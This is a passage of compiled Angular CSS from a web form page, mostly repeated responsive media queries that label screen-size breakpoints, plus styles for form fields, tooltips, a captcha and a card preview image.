      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-sm orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-sm orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-sm orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-md  "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-md orientation-portrait "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-md orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-md orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-md orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-md orientation-landscape "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-md orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-md orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-md orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-lg  "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-lg orientation-portrait "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-lg orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-lg orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-lg orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-lg orientation-landscape "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-lg orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-lg orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c2313363750]:before {
          content: "screen-lg orientation-landscape resolution-2x"
        }
      }

      img.swisscard-preview[_ngcontent-ng-c2313363750] {
        width: 60%
      }

      @media screen and (max-width: 767px) {
        img.swisscard-preview[_ngcontent-ng-c2313363750] {
          width: 100%
        }
      }

      .mod-abo-selection[_ngcontent-ng-c2313363750] {
        margin-left: -1rem
      }

      button[_ngcontent-ng-c2313363750] {
        font-size: 1.7rem;
        margin: 0 0 1rem 1rem
      }

      button[_ngcontent-ng-c2313363750] img[_ngcontent-ng-c2313363750] {
        height: 3rem;
        margin: -.5rem .5rem -.5rem -1rem
      }

      .hint-ckm-not-found[_ngcontent-ng-c2313363750] {
        margin-top: 2rem;
        margin-bottom: 0
      }
    </style>
    <style>
      .form-text-data-protection[_ngcontent-ng-c4263735718] {
        margin-bottom: 3rem
      }
    </style>
    <style>
      div.form-group[_ngcontent-ng-c2609923446] {
        min-height: 30px
      }

      .input-wrapper .mod-formelem__check .mod-formelem--wrapper {
        position: absolute
      }
    </style>
    <style>
      .tooltip--messages.col-sm-offset-4 .tooltip--message {
        padding-top: 0 !important
      }

      .tooltip--messages {
        display: block
      }

      .has-validation.form-group .tooltip--messages.tooltip--messages__errors {
        display: block
      }
    </style>
    <style>
      #clearfix[_ngcontent-ng-c4174421193]:before,
      #clearfix[_ngcontent-ng-c4174421193]:after {
        content: " ";
        display: table
      }

      #clearfix[_ngcontent-ng-c4174421193]:after {
        clear: both
      }

      #justify[_ngcontent-ng-c4174421193] {
        text-align: justify
      }

      #justify[_ngcontent-ng-c4174421193]:after {
        content: "";
        display: inline-block;
        width: 100%
      }

      #link-in-text[_ngcontent-ng-c4174421193],
      #link-in-text[_ngcontent-ng-c4174421193]:hover,
      #link-in-text[_ngcontent-ng-c4174421193]:focus,
      #link-in-text[_ngcontent-ng-c4174421193]:active,
      #link-in-text[_ngcontent-ng-c4174421193]:visited {
        color: #1e416e;
        outline: none;
        text-decoration: underline
      }

      #link-in-text[_ngcontent-ng-c4174421193]:hover,
      #link-in-text[_ngcontent-ng-c4174421193]:focus {
        color: #173256;
        text-decoration: underline
      }

      #overlay[_ngcontent-ng-c4174421193] {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%
      }

      #trim-margin[_ngcontent-ng-c4174421193]>[_ngcontent-ng-c4174421193]:first-child {
        margin-top: 0 !important
      }

      #trim-margin[_ngcontent-ng-c4174421193]>[_ngcontent-ng-c4174421193]:last-child {
        margin-bottom: 0 !important
      }

      body[_ngcontent-ng-c4174421193]:before {
        content: "";
        visibility: hidden;
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        border: 0
      }

      @media screen and (max-width: 767px) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-xs  "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-xs orientation-portrait "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-xs orientation-portrait resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-xs orientation-landscape "
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-xs orientation-landscape resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-sm  "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-sm orientation-portrait "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-sm orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-sm orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-sm orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-sm orientation-landscape "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-sm orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-sm orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-sm orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-md  "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-md orientation-portrait "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-md orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-md orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-md orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-md orientation-landscape "
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-md orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-md orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 992px) and (max-width: 1199px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-md orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-lg  "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-lg orientation-portrait "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-lg orientation-portrait resolution-1x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-lg orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 1200px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (min-width: 1200px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-lg orientation-portrait resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-lg orientation-landscape "
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-lg orientation-landscape resolution-1x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-lg orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (min-width: 1200px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (min-width: 1200px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c4174421193]:before {
          content: "screen-lg orientation-landscape resolution-2x"
        }
      }

      .input-text-component-mixin[_ngcontent-ng-c4174421193] .input-group--wrapper[_ngcontent-ng-c4174421193] {
        position: relative
      }

      .input-text-component-mixin[_ngcontent-ng-c4174421193] .tooltip--root[_ngcontent-ng-c4174421193] {
        z-index: 1000
      }

      @media screen and (max-width: 767px) {
        .input-text-component-mixin[_ngcontent-ng-c4174421193] .tooltip--root[_ngcontent-ng-c4174421193] {
          display: none
        }
      }

      .input-text-component-mixin[_ngcontent-ng-c4174421193] .tooltip-inner[_ngcontent-ng-c4174421193] {
        max-width: 300px
      }

      .input-text-component-mixin[_ngcontent-ng-c4174421193] .js-tooltip--message[_ngcontent-ng-c4174421193] {
        display: none
      }

      @media screen and (max-width: 767px) {
        .input-text-component-mixin[_ngcontent-ng-c4174421193] .js-tooltip--message[_ngcontent-ng-c4174421193] {
          padding-left: 0;
          padding-right: 0;
          display: block;
          color: #2a5386;
          position: relative;
          font-size: 12px;
          clear: both
        }
      }

      .input-text-component-mixin[_ngcontent-ng-c4174421193] .mod-formelem-password[_ngcontent-ng-c4174421193] {
        margin-top: 8px
      }

      .input-group--wrapper {
        position: relative
      }

      .tooltip--root {
        z-index: 1000
      }

      @media screen and (max-width: 767px) {
        .tooltip--root {
          display: none
        }
      }

      .tooltip-inner {
        max-width: 300px
      }

      .js-tooltip--message {
        display: none
      }

      @media screen and (max-width: 767px) {
        .js-tooltip--message {
          padding-left: 0;
          padding-right: 0;
          display: block;
          color: #2a5386;
          position: relative;
          font-size: 12px;
          clear: both
        }
      }

      .mod-formelem-password {
        margin-top: 8px
      }

      ngb-typeahead-window {
        width: 100%;
        padding: 0 !important;
        margin: 0 !important
      }

      ngb-typeahead-window button {
        background: white;
        display: block;
        width: 100%;
        text-align: left;
        border: 0;
        padding: 1rem
      }

      ngb-typeahead-window button.active {
        background: #f4f4f4
      }

      .input-group--wrapper[_ngcontent-ng-c4174421193] {
        position: relative
      }

      .tooltip--root[_ngcontent-ng-c4174421193] {
        z-index: 1000
      }

      @media screen and (max-width: 767px) {
        .tooltip--root[_ngcontent-ng-c4174421193] {
          display: none
        }
      }

      .tooltip-inner[_ngcontent-ng-c4174421193] {
        max-width: 300px
      }

      .js-tooltip--message[_ngcontent-ng-c4174421193] {
        display: none
      }

      @media screen and (max-width: 767px) {
        .js-tooltip--message[_ngcontent-ng-c4174421193] {
          padding-left: 0;
          padding-right: 0;
          display: block;
          color: #2a5386;
          position: relative;
          font-size: 12px;
          clear: both
        }
      }

      .mod-formelem-password[_ngcontent-ng-c4174421193] {
        margin-top: 8px
      }
    </style>
    <style>
      .mod-add-margin-before[_ngcontent-ng-c4042793679] {
        margin-top: 2rem !important
      }
    </style>
    <style>
      .frc-captcha[_ngcontent-ng-c2902921070] {
        margin: auto;
        border: none
      }
    </style>
    <style>
      div[app-form-input-checkbox][_ngcontent-ng-c2170418040] {
        margin-bottom: -8px
      }
    </style>
    <style>
      #clearfix[_ngcontent-ng-c698169312]:before,
      #clearfix[_ngcontent-ng-c698169312]:after {
        content: " ";
        display: table
      }

      #clearfix[_ngcontent-ng-c698169312]:after {
        clear: both
      }

      #justify[_ngcontent-ng-c698169312] {
        text-align: justify
      }

      #justify[_ngcontent-ng-c698169312]:after {
        content: "";
        display: inline-block;
        width: 100%
      }

      #link-in-text[_ngcontent-ng-c698169312],
      #link-in-text[_ngcontent-ng-c698169312]:hover,
      #link-in-text[_ngcontent-ng-c698169312]:focus,
      #link-in-text[_ngcontent-ng-c698169312]:active,
      #link-in-text[_ngcontent-ng-c698169312]:visited {
        color: #1e416e;
        outline: none;
        text-decoration: underline
      }

      #link-in-text[_ngcontent-ng-c698169312]:hover,
      #link-in-text[_ngcontent-ng-c698169312]:focus {
        color: #173256;
        text-decoration: underline
      }

      #overlay[_ngcontent-ng-c698169312] {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%
      }

      #trim-margin[_ngcontent-ng-c698169312]>[_ngcontent-ng-c698169312]:first-child {
        margin-top: 0 !important
      }

      #trim-margin[_ngcontent-ng-c698169312]>[_ngcontent-ng-c698169312]:last-child {
        margin-bottom: 0 !important
      }

      body[_ngcontent-ng-c698169312]:before {
        content: "";
        visibility: hidden;
        position: absolute;
        width: 1px;
        height: 1px;
        padding: 0;
        margin: -1px;
        overflow: hidden;
        clip: rect(0, 0, 0, 0);
        border: 0
      }

      @media screen and (max-width: 767px) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-xs  "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-xs orientation-portrait "
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-xs orientation-portrait resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: portrait) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-xs orientation-portrait resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-xs orientation-landscape "
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-xs orientation-landscape resolution-1x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 96dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.3),
      screen and (max-width: 767px) and (orientation: landscape) and (-webkit-min-device-pixel-ratio: 1.2291666666666667),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 118dpi),
      screen and (max-width: 767px) and (orientation: landscape) and (min-resolution: 1.3dppx) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-xs orientation-landscape resolution-2x"
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-sm  "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-sm orientation-portrait "
        }
      }

      @media screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (-webkit-min-device-pixel-ratio: 1),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 96dpi),
      screen and (min-width: 768px) and (max-width: 991px) and (orientation: portrait) and (min-resolution: 1dppx) {
        body[_ngcontent-ng-c698169312]:before {
          content: "screen-sm orientation-portrait resolution-1x"
        }
      }

